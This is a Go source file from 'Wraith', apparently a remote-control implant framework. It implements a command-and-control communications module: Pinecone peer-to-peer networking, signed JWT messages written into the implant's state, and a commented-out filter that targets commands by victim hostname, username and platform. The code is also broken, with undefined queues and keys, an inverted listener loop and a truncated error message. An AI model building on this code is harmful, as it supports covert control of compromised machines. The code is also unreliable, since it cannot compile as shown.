package stdmod

import (
	"context"
	"crypto/ed25519"
	"fmt"
	"net"
	"sync"
	"time"

	"git.0x1a8510f2.space/0x1a8510f2/wraith/wraith/libwraith"
	pineconeM "github.com/matrix-org/pinecone/multicast"
	pineconeR "github.com/matrix-org/pinecone/router"
	"github.com/pascaldekloe/jwt"
)

// A CommsManager module implementation which utilises (optionally) encrypted JWT
// as a base for its transfer protocol. This allows messages to be signed and
// verified both by the C2 and by Wraith. Otherwise, this CommsManager lacks any
// particularly advanced features and is meant as a simple default which does a
// good job in most usecases.
type PineconeJWTCommsManagerModule struct {
	mutex sync.Mutex

	// Configuration properties

	OwnPrivKey         ed25519.PrivateKey
	AdminPubKey        ed25519.PublicKey
	UseInboundPinecone bool
	UseMulticast       bool
	StaticPeers        []string
}

func (m *PineconeJWTCommsManagerModule) Mainloop(ctx context.Context, w *libwraith.Wraith) {
	// Ensure this instance is only started once and mark as running if so
	single := m.mutex.TryLock()
	if !single {
		panic(fmt.Errorf("%s already running", libwraith.MOD_COMMS_MANAGER))
	}
	defer m.mutex.Unlock()

	// Make sure keys are valid
	if keylen := len(m.OwnPrivKey); keylen != ed25519.PrivateKeySize {
		panic(fmt.Errorf("[%s] incorrect private key size (is %d, should be %d)", libwraith.MOD_COMMS_MANAGER, keylen, ed25519.PublicKeySize))
	}
	if keylen := len(m.AdminPubKey); keylen != ed25519.PublicKeySize {
		panic(fmt.Errorf("[%s] incorrect public key size (is %d, should be %d)", libwraith.MOD_COMMS_MANAGER, keylen, ed25519.PublicKeySize))
	}

	// Init pinecone router
	router := pineconeR.NewRouter(nil, m.OwnPrivKey, false)

	//pQUIC := pineconeS.NewSessions(nil, router)

	// If inbound pinecone connections are allowed, start listening
	if m.UseInboundPinecone {
		go func() {
			// Spawn a listener on a random port
			listener, err := net.Listen("tcp", ":0")
			if err != nil {
				panic(fmt.Errorf("[%s] failed to ", err))
			}

			// Loop until exit is requested
			for ctx.Err() != nil {
				conn, err := listener.Accept()
				if err != nil {
					continue
				}

				port, _ := router.Connect(
					conn,
					pineconeR.ConnectionPeerType(pineconeR.PeerTypeRemote),
				)
			}

			listener.Close()
		}()
	}

	// If enabled, start multicast
	if m.UseMulticast {
		pMulticast := pineconeM.NewMulticast(nil, router)
		pMulticast.Start()
	}

	/*connectToStaticPeer := func() {
		connected := map[string]bool{} // URI -> connected?
		for _, uri := range m.StaticPeers {
			connected[uri] = false
		}
		attempt := func() {
			for k := range connected {
				connected[k] = false
			}
			for _, info := range router.Peers() {
				connected[info.URI] = true
			}
			for k, online := range connected {
				if !online {
					_ = conn.ConnectToPeer(router, k)
				}
			}
		}
		for {
			attempt()
			time.Sleep(time.Second * 5)
		}
	}*/

	// Mainloop
	for {
		select {
		// Trigger exit when requested
		case <-ctx.Done():
			return

		// Manage transmit queue
		case data := <-txQueue:
			// Make sure the data is of the correct type/format, else ignore
			txdata, ok := data.(map[string]any)
			if !ok {
				continue
			}

			var claims jwt.Claims

			// Put all data under "w" key
			claims.Set = map[string]interface{}{"w": txdata}

			claims.EdDSASign(m.TxKey)

		// Manage receive queue
		case data := <-rxQueue:
			// If the data is not a bytearray, it's not a JWT token so should be ignored.
			databytes, ok := data.([]byte)
			if !ok {
				continue
			}

			// Attempt to parse given data as a JWT.
			claims, err := jwt.EdDSACheck(databytes, m.RxKey)

			// If we couldn't parse the data, do not attempt further parsing. No error
			// needs to be reported because this just means we received invalid data.
			if err != nil {
				continue
			}

			// Make sure the token is valid, don't consider expired tokens.
			if !claims.Valid(time.Now()) {
				continue
			}

			if wKey, ok := claims.Set["w"]; !ok {
				// Make sure that the token has a "w" key which holds all Wraith data.

				continue
			} else if wKeyMap, ok := wKey.(map[string]interface{}); !ok {
				// Make sure the "w" key is map[string]interface{} as expected.

				continue
			} else {
				// If all is well, send the subkeys of the "w" key to the appropriate shm cells

				for cell, value := range wKeyMap {
					w.SHMSet(cell, value)
				}
			}
		}
	}
}

// Return the name of this module as libwraith.MOD_COMMS_MANAGER
func (m *PineconeJWTCommsManagerModule) WraithModuleName() string {
	return libwraith.MOD_COMMS_MANAGER
}

/*

type ValidityModule struct {
	wraith *libwraith.Wraith
}

func (m *ValidityModule) WraithModuleInit(wraith *libwraith.Wraith) {
	m.wraith = wraith
}
func (m *ValidityModule) ProtoPartModule() {}

func (m *ValidityModule) ProcessProtoPart(hkvs *libwraith.HandlerKeyValueStore, data interface{}) {
	isValid := false

	defer func() {
		if isValid {
			hkvs.Set("validity.valid", true)
		} else {
			hkvs.Set("validity.valid", false)
		}
	}()

	// Enforce validity constraints

	// If there are validity constraints (this function was called), but they are incorrectly formatted,
	// always assume invalid
	if validity, ok := data.(map[string]string); ok {
		// Wraith Fingerprint/ID restriction
		if constraint, ok := validity["wfpt"]; ok {
			// Always fail if an ID restriction is present and Wraith has not been given an ID
			if m.wraith.Conf.Fingerprint == "" {
				return
			}
			match, err := regexp.Match(constraint, []byte(m.wraith.Conf.Fingerprint))
			if !match || err != nil {
				// If the constraint was not satisfied, the data should be dropped
				// If there was an error in checking the match, Wraith will fallback to fail
				// as to avoid running erroneous commands on every Wraith.
				return
			}
		}

		// Host Fingerprint/ID restriction
		if constraint, ok := validity["hfpt"]; ok {
			match, err := regexp.Match(constraint, []byte{}) // TODO
			if !match || err != nil {
				return
			}
		}

		// Hostname restriction
		if constraint, ok := validity["hnme"]; ok {
			hostname, err := os.Hostname()
			if err != nil {
				// Always fail if hostname could not be checked
				return
			}
			match, err := regexp.Match(constraint, []byte(hostname))
			if !match || err != nil {
				return
			}
		}

		// Running username restriction
		if constraint, ok := validity["rusr"]; ok {
			user, err := user.Current()
			if err != nil {
				return
			}
			match, err := regexp.Match(constraint, []byte(user.Username))
			if !match || err != nil {
				return
			}
		}

		// Platform (os/arch) restriction
		if constraint, ok := validity["plfm"]; ok {
			platform := fmt.Sprintf("%s|%s", runtime.GOOS, runtime.GOARCH)
			match, err := regexp.Match(constraint, []byte(platform))
			if !match || err != nil {
				return
			}
		}

		// If we got this far, all checks passed so the payload is valid
		isValid = true
		return
	} else {
		return
	}
}
*/
